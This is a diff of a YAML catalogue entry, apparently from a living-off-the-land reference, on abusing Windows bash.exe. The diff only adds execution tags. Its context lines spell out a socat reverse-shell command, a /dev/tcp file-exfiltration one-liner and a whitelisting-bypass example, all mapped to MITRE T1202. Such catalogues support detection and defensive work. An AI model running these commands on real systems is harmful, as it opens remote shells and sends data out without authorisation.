@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 10
+    Tags:
+      - Execute: CMD
   - Command: bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
     Description: Executes a reverseshell
     Usecase: Performs execution of specified file, can be used as a defensive evasion.
@@ -18,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 10
+    Tags:
+      - Execute: CMD
   - Command: bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'
     Description: Exfiltrate data
     Usecase: Performs execution of specified file, can be used as a defensive evasion.
@@ -25,6 +29,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 10
+    Tags:
+      - Execute: CMD
   - Command: bash.exe -c calc.exe
     Description: Executes calc.exe from bash.exe
     Usecase: Performs execution of specified file, can be used to bypass Application Whitelisting.
@@ -32,6 +38,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 10
+    Tags:
+      - Execute: CMD
 Full_Path:
   - Path: C:\Windows\System32\bash.exe
   - Path: C:\Windows\SysWOW64\bash.exe
